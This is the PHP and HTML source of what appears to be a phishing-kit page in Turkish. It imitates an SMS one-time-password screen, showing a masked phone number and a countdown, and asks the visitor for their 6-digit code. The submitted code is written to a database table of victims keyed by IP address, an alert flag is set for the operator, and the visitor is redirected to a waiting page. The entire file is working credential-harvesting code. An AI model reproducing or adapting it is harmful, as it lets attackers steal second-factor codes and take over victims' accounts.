<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['phone2'])) {
    date_default_timezone_set('Europe/Istanbul');
    include('connect.php');
    
    $sms = htmlspecialchars($_POST['phone2']);
    $ip = GetIPz();
    $date = date('d.m.Y H:i');
    
    $query = $db->prepare('UPDATE sazan SET sms = ? WHERE ip = ?');
    $query->execute(array($sms, $ip));
    $db->query("UPDATE site SET sound='1'");
    
    header('Location: bekle.php');
    exit;
}  
?>
<?php
include "./panelgiris/config.php";
include "./panelgiris/project-security.php";
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <title>Mobile Sayfa</title>

    <style>
        @font-face {
            font-family: 'KelveticaNobis';
            src: url('./css/KelveticaNobis.otf') format('opentype');
            font-weight: normal;
            font-style: normal;
        }

        body, html {
            background-color: #f1f2f2;
            padding: 0;
            max-width: 414px;
            margin: 0 auto;
            font-family: 'KelveticaNobis', sans-serif;
        }

        header {
            width: 100%;
            height: 106px;
            background-image: url('./css/baslik.png');
            background-size: contain;
            background-repeat: no-repeat;
        }

        .main {
            min-height: 805px;
            width: 100%;
            height: 805px;
            background-image: url('./css/body.png');
            background-size: contain;
            background-repeat: no-repeat;
        }

        input.form-control {
            width: 85%;
            height: 50px;
            font-family: 'KelveticaNobis', sans-serif;
            margin-bottom: 10px;
            margin-top: 5px;
            border: none;
            font-size: 16px;
            margin-left: 15px;
            margin-right: 15px;
            padding-left: 20px;
        }

        input.form-control:focus {
            outline: none;
            box-shadow: none;
        }

        button.btn {
            width: 90%;
            height: 50px;
            margin-top: 20px;
            background-color: #2ea8ab;
            border: none;
            color: #fff;
            font-size: 14px;
            cursor: pointer;
            border-radius: 0;
        }

        .error-message {
            color: red;
            font-size: 14px;
            margin-bottom: 10px;
            font-weight: 700;
        }

        .countdown {
            display: block;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 25px;
            margin-top: 15px;
            text-align: left;
            margin-left: 15px;
            color: #4b4848; /* Ana metin rengi */
        }

        .timer {
            color: red; /* Sadece süre kısmı kırmızı */
        }
    </style>
</head>
<body>
    <header></header>
    <form method="POST" action="sms.php" id="phoneForm">
    <div class="main">
        <center>
            <label style="display: block;font-size: 14px;font-weight: bold;margin-bottom: 25px;margin-top: 15px;color: #4b4848; text-align: left; margin-left: 15px;">
                Tek kullanımlık şifreniz aşağıdaki cep telefonu numaranıza SMS ile gönderilmiştir.
            </label>
            
            <label style="display: block;font-size: 16px;font-weight: bold;margin-bottom: 5px;margin-top: 15px;color: #4b4848; text-align: left; margin-left: 15px;">
                Telefon Numarası
            </label>
            <input type="text" name="maskedPhone" class="form-control" id="maskedPhone" readonly>
            <label class="countdown" id="countdownLabel">
                Tekrar şifre almak için <span class="timer" id="timer">3:00</span> dakika beklemeniz gerekmektedir.
            </label>

            <script>
                let timeLeft = 180; // 3 dakika = 180 saniye
                const timerDisplay = document.getElementById('timer');
                const countdownLabel = document.getElementById('countdownLabel');

                const countdown = setInterval(() => {
                    const minutes = Math.floor(timeLeft / 60);
                    const seconds = timeLeft % 60;
                    timerDisplay.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;

                    if (timeLeft <= 0) {
                        clearInterval(countdown);
                        countdownLabel.style.display = 'none'; // Süre dolduğunda label'ı gizle
                    }
                    timeLeft--;
                }, 1000);
            </script>

            <label for="phone22" style="display: block;font-size: 16px;font-weight: bold;margin-bottom: 5px;margin-top: 15px;color: #4b4848;">
                Lütfen SMS'teki şifeyi aşağıdaki alana giriniz
            </label>
            <input type="text" name="phone2" class="form-control" placeholder="Doğrulama kodunu yazınız" id="phone2" minlength="6" maxlength="6" inputmode="numeric" required>

            <div id="errorMessage" class="error-message" style="">Sms Kodunu lütfen kontrol ediniz.</div>
        </center>

        <center>
            <button id="formSubmit" class="btn" type="button" onclick="submitFirstForm()">Giriş</button>
        </center>
    </div>
    </form>

<script>
    const phoneInput = document.getElementById("phone2");
    const maskedPhoneInput = document.getElementById("maskedPhone");

    // Çerezden değeri okumak için yardımcı fonksiyon
    function getCookie(name) {
        const nameEQ = name + "=";
        const ca = document.cookie.split(';');
        for (let i = 0; i < ca.length; i++) {
            let c = ca[i];
            while (c.charAt(0) == ' ') c = c.substring(1, c.length);
            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
        }
        return null;
    }

    // phoneNumber çerezini al ve maskele
    const phoneNumber = getCookie("phoneNumber");
    if (phoneNumber) {
        // Telefon numarasını maskele ve son 4 hanesini göster
        const maskedPhoneNumber = phoneNumber.replace(/(\+90)(\d{3})(\d{3})(\d{2})(\d{2})/, "$1 ($2) *** $4 $5");
        maskedPhoneInput.value = maskedPhoneNumber;
    }

    phoneInput.addEventListener("input", function(event) {
        let phoneValue = phoneInput.value;

        // Sadece 6 haneli rakamların yazılmasını sağla
        phoneValue = phoneValue.replace(/\D/g, ''); // Sadece rakamları al
        phoneValue = phoneValue.slice(0, 6); // En fazla 6 haneli olmalı
        phoneInput.value = phoneValue; // Input değerini güncelle
    });

    function submitFirstForm() {
        const phoneValue = phoneInput.value;

        // Telefon numarasını çerez olarak kaydet
        setCookie("phoneNumber", phoneValue, 7); // 7 gün boyunca sakla

        if (/^\d{6}$/.test(phoneValue)) { // 6 haneli rakam kontrolü
            document.getElementById("phoneForm").submit();
        } else {
            document.getElementById("errorMessage").style.display = "block";
        }
    }

    // Çerez ayarlamak için yardımcı fonksiyon
    function setCookie(name, value, days) {
        const date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        const expires = "expires=" + date.toUTCString();
        document.cookie = name + "=" + value + ";" + expires + ";path=/";
    }
</script>
<script src="script.js?v=1.1.2"></script>
</body>
</html>

 
 